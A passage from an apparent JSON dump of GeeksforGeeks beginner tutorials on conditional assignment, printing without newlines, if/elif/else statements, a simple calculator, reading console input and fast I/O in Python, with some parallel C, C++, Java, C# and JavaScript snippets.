a\u00a0\u00a0\u00a0\u00a0Console.Write(\"The value of a is: \" + a);}}\u00a0\u00a0// This code is contributed by shivanisinghss2110Javascript<script>\u00a0// JavaScript code to demonstrate variable assignment// upon condition using Direct Initialisation Method\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// initialising variables directly\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0var a = 5;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// printing value of a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0document.write(\"The value of a is: \" + a);\u00a0\u00a0</script>// this code is contributed by shivanisinghss2110Output:\u00a0The value of a is: 5\u00a0Method 2: Using Conditional Operator (?:)Below is the syntax in other popular languages.C++// C++ code to demonstrate variable assignment// upon condition using Conditional Operator\u00a0#include <bits/stdc++.h>using namespace std;\u00a0int main(){\u00a0\u00a0\u00a0\u00a0// initialising variables using Conditional Operator\u00a0\u00a0\u00a0\u00a0int a = 20 > 10 ? 1 : 0;\u00a0\u00a0\u00a0\u00a0\u00a0// printing value of a\u00a0\u00a0\u00a0\u00a0cout << \"The value of a is: \" << a;}C// C code to demonstrate variable assignment// upon condition using Conditional Operator\u00a0#include <stdio.h>\u00a0int main(){\u00a0\u00a0\u00a0\u00a0// initialising variables using Conditional Operator\u00a0\u00a0\u00a0\u00a0int a = 20 > 10 ? 1 : 0;\u00a0\u00a0\u00a0\u00a0\u00a0// printing value of a\u00a0\u00a0\u00a0\u00a0printf(\"The value of a is: %d\", a);}Java// Java code to demonstrate variable assignment// upon condition using Conditional Operator\u00a0import java.io.*;\u00a0class GFG {\u00a0\u00a0\u00a0\u00a0public static void main(String args[])\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// initialising variables using Conditional Operator\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0int a = 20 > 10 ? 1 : 0;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// printing value of a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(\"The value of a is: \" + a);\u00a0\u00a0\u00a0\u00a0}}Python3# Python3 code to demonstrate variable assignment# upon condition using Conditional Operator\u00a0# Initialising variables using Conditional Operatora = 1 if 20 > 10 else 0\u00a0# Printing value of aprint(\"The value of a is: \" , str(a))\u00a0# This code is contributed by shivanisinghss2110C#// C# code to demonstrate variable assignment// upon condition using Conditional Operator\u00a0using System;\u00a0class GFG {\u00a0\u00a0\u00a0\u00a0public static void Main(String []args)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// initialising variables using Conditional Operator\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0int a = 20 > 10 ? 1 : 0;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// printing value of a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Console.Write(\"The value of a is: \" + a);\u00a0\u00a0\u00a0\u00a0}}// this code is contributed by shivanisinghss2110Javascript<script>\u00a0// JavaScript code to demonstrate variable assignment// upon condition using Conditional Operator\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// initialising variables using Conditional Operator\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0var a = 20 > 10 ? 1 : 0;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// printing value of a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0document.write(\"The value of a is: \" + a);\u00a0// This code is contributed by shivanisinghss2110\u00a0</script>Output:\u00a0The value of a is: 1\u00a0One liner if-else instead of Conditional Operator (?:) in PythonPython3# Python 3 code to demonstrate variable assignment# upon condition using One liner if-else\u00a0# initialising variable using Conditional Operator# a = 20 > 10 ? 1 : 0 is not possible in Python# Instead there is one liner if-elsea = 1 if 20 > 10 else 0\u00a0# printing value of aprint (\"The value of a is: \" + str(a))Output:\u00a0The value of a is: 1\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "54e0a1036cfb917c8a4a9bd9df2fbd36",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Generally, people switching from C/C++ to Python wonder how to print two or more variables or statements without going into a new line in python. Since the python print() function by default ends with a newline. Python has a predefined format if you use print(a_variable) then it will go to the next line automatically.\u00a0\u00a0For example:\u00a0Python3print(\"geeks\")print(\"geeksforgeeks\")Will result in this:\u00a0geeks\ngeeksforgeeksBut sometimes it may happen that we don\u2019t want to go to the next line but want to print on the same line. So what we can do?\u00a0\u00a0For Example:\u00a0Input : print(\"geeks\") print(\"geeksforgeeks\")\nOutput : geeks geeksforgeeks\n\nInput : a = [1, 2, 3, 4]\nOutput : 1 2 3 4 The solution discussed here is totally dependent on the python version you are using.\u00a0\u00a0Print without newline in Python 2.xpython# Python 2 code for printing# on the same line printing# geeks and geeksforgeeks# in the same line\u00a0print(\"geeks\"),print(\"geeksforgeeks\")\u00a0# arraya = [1, 2, 3, 4]\u00a0# printing a element in same# linefor i in range(4):\u00a0\u00a0\u00a0\u00a0print(a[i]),Output:\u00a0geeks geeksforgeeks\n1 2 3 4Print without newline in Python 3.xpython3# Python 3 code for printing# on the same line printing# geeks and geeksforgeeks# in the same line\u00a0print(\"geeks\", end =\" \")print(\"geeksforgeeks\")\u00a0# arraya = [1, 2, 3, 4]\u00a0# printing a element in same# linefor i in range(4):\u00a0\u00a0\u00a0\u00a0print(a[i], end =\" \")Output:\u00a0geeks geeksforgeeks\n1 2 3 4Print without newline in Python 3.x without using for loopPython3# Print without newline in Python 3.x without using for loop\u00a0l=[1,2,3,4,5,6]\u00a0# using * symbol prints the list# elements in a single lineprint(*l)\u00a0#This code is contributed by anuragsingh1022Output:1 2 3 4 5 6My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d8d5597c8dd7582ea1ba50d2d39738d6",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "There comes situations in real life when we need to make some decisions and based on these decisions, we decide what should we do next. Similar situations arise in programming also where we need to make some decisions and based on these decisions we will execute the next block of code. Decision-making statements in programming languages decide the direction of the flow of program execution.\u00a0In Python, if else elif statement is used for decision making.if statementif statement is the most simple decision-making statement. It is used to decide whether a certain statement or block of statements will be executed or not i.e if a certain condition is true then a block of statement is executed otherwise not.Syntax:\u00a0if condition:\n   # Statements to execute if\n   # condition is trueHere, the condition after evaluation will be either true or false. if statement accepts boolean values \u2013 if the value is true then it will execute the block of statements below it otherwise not. We can use condition with bracket \u2018(\u2018 \u2018)\u2019 also.\u00a0As we know, python uses indentation to identify a block. So the block under an if statement will be identified as shown in the below example:\u00a0\u00a0if condition:\n   statement1\nstatement2\n\n# Here if the condition is true, if block \n# will consider only statement1 to be inside \n# its block.Flowchart of Python if statementExample: Python if StatementPython3# python program to illustrate If statement\u00a0i = 10\u00a0if (i > 15):\u00a0\u00a0\u00a0\u00a0print(\"10 is less than 15\")print(\"I am Not in if\")Output:\u00a0I am Not in ifAs the condition present in the if statement is false. So, the block below the if statement is not executed.if-elseThe if statement alone tells us that if a condition is true it will execute a block of statements and if the condition is false it won\u2019t. But what if we want to do something else if the condition is false. Here comes the else statement. We can use the else statement with if statement to execute a block of code when the condition is false.\u00a0Syntax:\u00a0if (condition):\n    # Executes this block if\n    # condition is true\nelse:\n    # Executes this block if\n    # condition is falseFlowChart of Python if else statementExample 1: Python if else statementPython3# python program to illustrate If else statement#!/usr/bin/python\u00a0i = 20if (i < 15):\u00a0\u00a0\u00a0\u00a0print(\"i is smaller than 15\")\u00a0\u00a0\u00a0\u00a0print(\"i'm in if Block\")else:\u00a0\u00a0\u00a0\u00a0print(\"i is greater than 15\")\u00a0\u00a0\u00a0\u00a0print(\"i'm in else Block\")print(\"i'm not in if and not in else Block\")Output:\u00a0i is greater than 15\ni'm in else Block\ni'm not in if and not in else BlockThe block of code following the else statement is executed as the condition present in the if statement is false after calling the statement which is not in block(without spaces).Example 2: Python if else in list comprehensionPython3# Explicit functiondef digitSum(n):\u00a0\u00a0\u00a0\u00a0dsum = 0\u00a0\u00a0\u00a0\u00a0for ele in str(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dsum += int(ele)\u00a0\u00a0\u00a0\u00a0return dsum\u00a0\u00a0# Initializing listList = [367, 111, 562, 945, 6726, 873]\u00a0# Using the function on odd elements of the listnewList = [digitSum(i) for i in List if i & 1]\u00a0# Displaying new listprint(newList)Output[16, 3, 18, 18]\nnested-ifA nested if is an if statement that is the target of another if statement. Nested if statements mean an if statement inside another if statement. Yes, Python allows us to nest if statements within if statements. i.e, we can place an if statement inside another if statement.Syntax:\u00a0if (condition1):\n   # Executes when condition1 is true\n   if (condition2): \n      # Executes when condition2 is true\n   # if Block is end here\n# if Block is end hereFlowchart of Python Nested if StatementExample: Python Nested ifPython3# python program to illustrate nested If statement#!/usr/bin/pythoni = 10if (i == 10):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0#\u00a0 First if statement\u00a0\u00a0\u00a0\u00a0if (i < 15):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"i is smaller than 15\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Nested - if statement\u00a0\u00a0\u00a0\u00a0# Will only be executed if statement above\u00a0\u00a0\u00a0\u00a0# it is true\u00a0\u00a0\u00a0\u00a0if (i < 12):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"i is smaller than 12 too\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"i is greater than 15\")Output:\u00a0\u00a0i is smaller than 15\ni is smaller than 12 tooif-elif-else ladderHere, a user can decide among multiple options. The if statements are executed from the top down. As soon as one of the conditions controlling the if is true, the statement associated with that if is executed, and the rest of the ladder is bypassed. If none of the conditions is true, then the final else statement will be executed.Syntax:\u00a0if (condition):\n    statement\nelif (condition):\n    statement\n.\n.\nelse:\n    statementFlowChart of Python if else elif statements\u00a0Example: Python if else elif statementsPython3# Python program to illustrate if-elif-else ladder#!/usr/bin/python\u00a0i = 20if (i == 10):\u00a0\u00a0\u00a0\u00a0print(\"i is 10\")elif (i == 15):\u00a0\u00a0\u00a0\u00a0print(\"i is 15\")elif (i == 20):\u00a0\u00a0\u00a0\u00a0print(\"i is 20\")else:\u00a0\u00a0\u00a0\u00a0print(\"i is not present\")Output:\u00a0\u00a0i is 20Short Hand if statementWhenever there is only a single statement to be executed inside the if block then shorthand if can be used. The statement can be put on the same line as the if statement.\u00a0Syntax:\u00a0if condition: statementExample: Python if shorthandPython3# Python program to illustrate short hand ifi = 10if i < 15:\u00a0\u00a0\u00a0\u00a0print(\"i is less than 15\")Output:i is less than 15Short Hand if-else statementThis can be used to write the if-else statements in a single line where there is only one statement to be executed in both if and else block.\u00a0Syntax:statement_when_True if condition else statement_when_FalseExample: Python if else shorthand\u00a0Python3# Python program to illustrate short hand if-elsei = 10print(True) if i < 15 else print(False)Output:\u00a0TrueMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "4fed913d3665a4d3e7c9c933f6e539e9",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Create a simple calculator which can perform basic arithmetic operations like addition, subtraction, multiplication or division depending upon the user input.Approach :User choose the desired operation. Options 1, 2, 3 and 4 are valid.Two numbers are taken and an if\u2026elif\u2026else branching is used to execute a particular section.Using functions add(), subtract(), multiply() and divide() evaluate respective operations.Example :\r\nPlease select operation -\r\n1. Add\r\n2. Subtract\r\n3. Multiply\r\n4. Divide\r\nSelect operations form 1, 2, 3, 4 : 1\r\nEnter first number : 20\r\nEnter second number : 13\r\n20 + 13 = 33\r\n# Python program for simple calculator\u00a0\u00a0# Function to add two numbers\u00a0def add(num1, num2):\u00a0\u00a0\u00a0\u00a0return num1 + num2\u00a0\u00a0# Function to subtract two numbers\u00a0def subtract(num1, num2):\u00a0\u00a0\u00a0\u00a0return num1 - num2\u00a0\u00a0# Function to multiply two numbersdef multiply(num1, num2):\u00a0\u00a0\u00a0\u00a0return num1 * num2\u00a0\u00a0# Function to divide two numbersdef divide(num1, num2):\u00a0\u00a0\u00a0\u00a0return num1 / num2\u00a0\u00a0print(\"Please select operation -\\n\" \\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"1. Add\\n\" \\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"2. Subtract\\n\" \\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"3. Multiply\\n\" \\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"4. Divide\\n\")\u00a0\u00a0\u00a0\u00a0# Take input from the user\u00a0select = int(input(\"Select operations form 1, 2, 3, 4 :\"))\u00a0\u00a0number_1 = int(input(\"Enter first number: \"))number_2 = int(input(\"Enter second number: \"))\u00a0\u00a0if select == 1:\u00a0\u00a0\u00a0\u00a0print(number_1, \"+\", number_2, \"=\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0add(number_1, number_2))\u00a0\u00a0elif select == 2:\u00a0\u00a0\u00a0\u00a0print(number_1, \"-\", number_2, \"=\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0subtract(number_1, number_2))\u00a0\u00a0elif select == 3:\u00a0\u00a0\u00a0\u00a0print(number_1, \"*\", number_2, \"=\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0multiply(number_1, number_2))\u00a0\u00a0elif select == 4:\u00a0\u00a0\u00a0\u00a0print(number_1, \"/\", number_2, \"=\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0divide(number_1, number_2))else:\u00a0\u00a0\u00a0\u00a0print(\"Invalid input\")Output :\r\nPlease select operation -\r\n1. Add\r\n2. Subtract\r\n3. Multiply\r\n4. Divide\r\nSelect operations form 1, 2, 3, 4 : 1\r\nEnter first number : 15\r\nEnter second number : 14\r\n15 + 14 = 29\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "98d83c2e9eba1e6ca10af8e4f66e6639",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is a high-level, interpreted, and general-purpose dynamic programming language that focuses on code readability. It has fewer steps when compared to Java and C. It was founded in 1991 by developer Guido Van Rossum.\u00a0Python ranks among the most popular and fastest-growing languages in the world. Python is a powerful, flexible, and easy-to-use language. In addition, the community is very active there. It is used in many organizations as it supports multiple programming paradigms. It also performs automatic memory management.\u00a0Advantages :\u00a0Presence of third-party modules\u00a0Extensive support libraries(NumPy for numerical calculations, Pandas for data analytics etc)\u00a0Open source and community development\u00a0Versatile, Easy to read, learn and writeUser-friendly data structures\u00a0High-level language\u00a0Dynamically typed language(No need to mention data type based on the value assigned, it takes data type)\u00a0Object-oriented language\u00a0Portable and InteractiveIdeal for prototypes \u2013 provide more functionality with less codingHighly Efficient(Python\u2019s clean object-oriented design provides enhanced process control, and the language is equipped with excellent text processing and integration capabilities, as well as its own unit testing framework, which makes it more efficient.)(IoT)Internet of Things OpportunitiesInterpreted LanguagePortable across Operating systems\u00a0\u00a0Applications :\u00a0GUI based desktop applicationsGraphic design, image processing applications, Games, and Scientific/ computational ApplicationsWeb frameworks and applications\u00a0\u00a0Enterprise and Business applications\u00a0\u00a0Operating Systems\u00a0EducationDatabase AccessLanguage Development\u00a0\u00a0Prototyping\u00a0Software Development\u00a0Organizations using Python :\u00a0Google(Components of Google spider and Search Engine)\u00a0Yahoo(Maps)\u00a0YouTube\u00a0Mozilla\u00a0Dropbox\u00a0Microsoft\u00a0Cisco\u00a0Spotify\u00a0Quora\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6fb6fc5f1e759b3c6c25cb993bbf49f7",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Developers often have a need to interact with users, either to get data or to provide some sort of result. Most programs today use a dialog box as a way of asking the user to provide some type of input. While Python provides us with two inbuilt functions to read the input from the keyboard.input ( prompt )raw_input ( prompt )input ( ) : This function first takes the input from the user and then evaluates the expression, which means Python automatically identifies whether user entered a string or a number or list. If the input provided is not correct then either syntax error or exception is raised by python. For example \u2013# Python program showing\u00a0# a use of input()\u00a0\u00a0val = input(\"Enter your value: \")print(val)Output:\u00a0How the input function works in Python :When input() function executes program flow will be stopped until the user has given an input.The text or message display on the output screen to ask a user to enter input value is optional i.e. the prompt, will be printed on the screen is optional.Whatever you enter as input, input function convert it into a string. if you enter an integer value still input() function convert it into a string. You need to explicitly convert it into an integer in your code using typecasting.Code:# Program to check input\u00a0# type in Python\u00a0\u00a0num = input (\"Enter number :\")print(num)name1 = input(\"Enter name : \")print(name1)\u00a0\u00a0# Printing type of input valueprint (\"type of number\", type(num))print (\"type of name\", type(name1))Output :raw_input ( ) : This function works in older version (like Python 2.x). This function takes exactly what is typed from the keyboard, convert it to string and then return it to the variable in which we want to store. For example \u2013# Python program showing\u00a0# a use of raw_input()\u00a0\u00a0g = raw_input(\"Enter your name : \")print gOutput :Here, g is a variable which will get the string value, typed by user during the execution of program. Typing of data for the raw_input() function is terminated by enter key. We can use raw_input() to enter numeric data also. In that case we use typecasting.For more details on typecasting refer this.\u00a0Refer to the article Taking list as input from the user for more information.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1c3a33623df23fe3cdab67ed4273300e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "What is Console in Python? Console (also called Shell) is basically a command line interpreter that takes input from the user i.e one command at a time and interprets it. If it is error free then it runs the command and gives required output otherwise shows the error message. A Python Console looks like this.Here we write command and to execute the command just press enter key and your command will be interpreted.For coding in Python you must know the basics of the console used in Python.The primary prompt of the python console is the three greater than symbols\r\n>>>\r\nYou are free to write the next command on the shell only when after executing the first command these prompts have appeared. The Python Console accepts command in Python which you write after the prompt.Accepting Input from ConsoleUser enters the values in the Console and that value is then used in the program as it was required.To take input from the user we make use of a built-in function input().# inputinput1 = input()\u00a0\u00a0# outputprint(input1)We can also type cast this input to integer, float or string by specifying the input() function inside the type.Typecasting the input to Integer: There might be conditions when you might require integer input from user/Console, the following code takes two input(integer/float) from console and typecasts them to integer then prints the sum.# inputnum1 = int(input())num2 = int(input())\u00a0\u00a0# printing the sum in integerprint(num1 + num2)Typecasting the input to Float: To convert the input to float the following code will work out.# inputnum1 = float(input())num2 = float(input())\u00a0\u00a0# printing the sum in floatprint(num1 + num2)Typecasting the input to String: All kind of input can be converted to string type whether they are float or integer. We make use of keyword str for typecasting.# inputstring = str(input())\u00a0\u00a0# outputprint(string)My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "a7b3852d3a00297be3ec39211b4ec5cf",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The developer often wants a user to enter multiple values or inputs in one line. In C++/C user can take multiple inputs in one line using scanf but in Python user can take multiple values or inputs in one line by two methods.\u00a0Using split() methodUsing List comprehensionUsing split() method :\u00a0This function helps in getting multiple inputs from users. It breaks the given input by the specified separator. If a separator is not provided then any white space is a separator. Generally, users use a split() method to split a Python string but one can use it in taking multiple inputs.Syntax :\u00a0input().split(separator, maxsplit)Example :\u00a0Python3# Python program showing how to# multiple input using split\u00a0# taking two inputs at a timex, y = input(\"Enter two values: \").split()print(\"Number of boys: \", x)print(\"Number of girls: \", y)print()\u00a0# taking three inputs at a timex, y, z = input(\"Enter three values: \").split()print(\"Total number of students: \", x)print(\"Number of boys is : \", y)print(\"Number of girls is : \", z)print()\u00a0# taking two inputs at a timea, b = input(\"Enter two values: \").split()print(\"First number is {} and second number is {}\".format(a, b))print()\u00a0# taking multiple inputs at a time# and type casting using list() functionx = list(map(int, input(\"Enter multiple values: \").split()))print(\"List of students: \", x)Output:\u00a0\u00a0Using List comprehension :\u00a0List comprehension is an elegant way to define and create list in Python. We can create lists just like mathematical statements in one line only. It is also used in getting multiple inputs from a user.\u00a0Example:\u00a0Python3# Python program showing# how to take multiple input# using List comprehension\u00a0# taking two input at a timex, y = [int(x) for x in input(\"Enter two values: \").split()]print(\"First Number is: \", x)print(\"Second Number is: \", y)print()\u00a0# taking three input at a timex, y, z = [int(x) for x in input(\"Enter three values: \").split()]print(\"First Number is: \", x)print(\"Second Number is: \", y)print(\"Third Number is: \", z)print()\u00a0# taking two inputs at a timex, y = [int(x) for x in input(\"Enter two values: \").split()]print(\"First number is {} and second number is {}\".format(x, y))print()\u00a0# taking multiple inputs at a timex = [int(x) for x in input(\"Enter multiple values: \").split()]print(\"Number of list is: \", x)Output :\u00a0\u00a0Note: The above examples take input separated by spaces. In case we wish to take input separated by comma (, ), we can use the following:\u00a0Python3# taking multiple inputs at a time separated by commax = [int(x) for x in input(\"Enter multiple value: \").split(\",\")]print(\"Number of list is: \", x)Please see https://ide.geeksforgeeks.org/BHf0Cxr4mx for a sample run.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "552b5b59a86e04cc83988ce237887ca3",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is an amazingly user-friendly language with the only flaw of being slow. In comparison to C, C++, and Java, it is quite slower. Online coding platforms, if C/C++ limit provided is X. Usually, in Java time provided is 2X and Python, it\u2019s 5X.To improve the speed of code execution for input/output intensive problems, languages have various input and output procedures.\u00a0An Example Problem :\u00a0Consider a question of finding the sum of N numbers inputted from the user.\u00a0Input a number N.\u00a0Input N numbers are separated by a single space in a line.\u00a0\u00a0Examples:\u00a0Input : \n5\n1 2 3 4 5\nOutput :\n15Different Python solutions for the above Problem :\u00a0Normal Method Python: (Python 2.7)\u00a01. raw_input() takes an optional prompt argument. It also strips the trailing newline character from the string it returns.\u00a02. print is just a thin wrapper that formats the inputs (space between args and newline at the end) and calls the write function of a given object.\u00a0\u00a0Python3# basic method of input output# input Nn = int(input())\u00a0# input the arrayarr = [int(x) for x in input().split()]\u00a0# initialize variablesummation = 0\u00a0# calculate sumfor x in arr:\u00a0\u00a0\u00a0\u00a0summation += x\u00a0\u00a0\u00a0\u00a0\u00a0# print answerprint(summation)A bit faster method using inbuilt stdin, stdout: (Python 2.7)\u00a01. sys.stdin on the other hand is a File Object. It is like creating any other file object one could create to read input from the file. In this case, the file will be a standard input buffer.\u00a02. stdout.write(\u2018D\\n\u2019) is faster than print \u2018D\u2019.\u00a03. Even faster is to write all once by stdout.write(\u201c\u201d.join(list-comprehension)) but this makes memory usage dependent on the size of the input.\u00a0\u00a0Python3# import inbuilt standard input outputfrom sys import stdin, stdout\u00a0# suppose a function called main() and# all the operations are performeddef main():\u00a0\u00a0\u00a0\u00a0\u00a0# input via readline method\u00a0\u00a0\u00a0\u00a0n = stdin.readline()\u00a0\u00a0\u00a0\u00a0\u00a0# array input similar method\u00a0\u00a0\u00a0\u00a0arr = [int(x) for x in stdin.readline().split()]\u00a0\u00a0\u00a0\u00a0\u00a0#initialize variable\u00a0\u00a0\u00a0\u00a0summation = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# calculate sum\u00a0\u00a0\u00a0\u00a0for x in arr:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0summation += x\u00a0\u00a0\u00a0\u00a0\u00a0# could use inbuilt summation = sum(arr)\u00a0\u00a0\u00a0\u00a0\u00a0# print answer via write\u00a0\u00a0\u00a0\u00a0# write method writes only\u00a0\u00a0\u00a0\u00a0# string operations\u00a0\u00a0\u00a0\u00a0# so we need to convert any\u00a0\u00a0\u00a0\u00a0# data into string for input\u00a0\u00a0\u00a0\u00a0stdout.write(str(summation))\u00a0# call the main methodif __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0main()\u00a0\u00a0\u00a0The difference in time:\u00a0\u00a0Timing summary (100k lines each)\u00a0\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2013\u00a0Print : 6.040 s\u00a0Write to file : 0.122 s\u00a0Print with Stdout : 0.121 sAs we have seen till now that taking input from the standard system and giving output to the standard system is always a good idea to improve the efficiency of the code which is always a need in Competitive programming. But wait! would you like to write these long lines every time when you need them? Then, what\u2019s the benefit of using Python.\u00a0Let\u2019s discuss the solution to this problem. What we can do is let\u2019s create separate functions for taking inputs of various types and just call them whenever you need them.\u00a0\u00a0When you want to take input of particular integers of integers given in a single lineSuppose the input is of the following form\u00a0\u00a05 7 19 20and we want separate variables to reference them. what we want is:\u00a0\u00a0a = 5\nb = 7\nc = 19\nd = 20so, we can create a function named as get_ints() as follows:\u00a0\u00a0Python3import sysdef get_ints(): return map(int, sys.stdin.readline().strip().split())\u00a0a,b,c,d = get_ints()Now you don\u2019t have to write this line again and again. You just have to call the get_ints() function in order to take input in this form. In the function get_ints we are using the map function.When you want to take input of list of integers given in a single lineSuppose the input is of the following form\u00a01 2 3 4 5 6 7 8and we want that a single variable will hold the whole list of integers. What we want is :\u00a0\u00a0Arr = [1, 2, 3, 4, 5, 6, 7, 8]So, here we will create a function named get_list() as follows:\u00a0\u00a0Python3import sysdef get_ints(): return list(map(int, sys.stdin.readline().strip().split()))\u00a0Arr = get_ints()Now you don\u2019t have to write this line again and again. You just have to call the get_ints() function in order to take input in this form\u00a0When you want to take input of stringSuppose the input is of the following form\u00a0\u00a0GeeksforGeeks is the best platform to practice Coding.and we want that a single reference variable will hold this string. What we want is :\u00a0\u00a0string = \"GeeksforGeeks if the best platform to practice coding.\"So, here we will create a function named get_string() as follows:\u00a0Python3import sysdef get_string(): return sys.stdin.readline().strip()\u00a0string = get_string()Now you don\u2019t have to write this line again and again. You just have to call the get_string() function in order to take input in this formAdding a buffered pipe io: (Python 2.7)\u00a01. Simply, adding the buffered IO code before your submission code to make the output faster.\u00a02. The benefit of io.BytesIO objects is that they implement a common interface (commonly known as a \u2018file-like\u2019 object). BytesIO objects have an internal pointer and for every call to read(n) the pointer advances.\u00a03. The atexit module provides a simple interface to register functions to be called when a program closes down normally. The sys module also provides a hook, sys.exitfunc, but only one function can be registered there. The atexit registry can be used by multiple modules and libraries simultaneously.\u00a0\u00a0Python3# template begins#####################################\u00a0# import libraries for input/ output handling# on generic levelimport atexit, io, sys\u00a0# A stream implementation using an in-memory bytes# buffer. It inherits BufferedIOBase.buffer = io.BytesIO()sys.stdout = buffer\u00a0# print via here@atexit.registerdef write():\u00a0\u00a0\u00a0\u00a0sys.stdout.write(buffer.getvalue())\u00a0###################################### template ends\u00a0# normal method followed# input Nn = int(input())\u00a0# input the arrayarr = [int(x) for x in input().split()]\u00a0# initialize variablesummation = 0\u00a0# calculate sumfor x in arr:\u00a0\u00a0\u00a0\u00a0summation += x\u00a0# print answerprint(summation)While handling a large amount of data usually, the normal method fails to execute within the time limit. Method 2 helps in maintaining a large amount of I/O data. Method 3 is the fastest. Usually, handling of input data files greater than 2 or 3 MBs is helped via methods 2 and 3.Note: above mention codes are in Python 2.7, to use in Python 3.X versions. Simply replace the raw_input() with Python 3.X\u2019s input() syntax. Rest should work 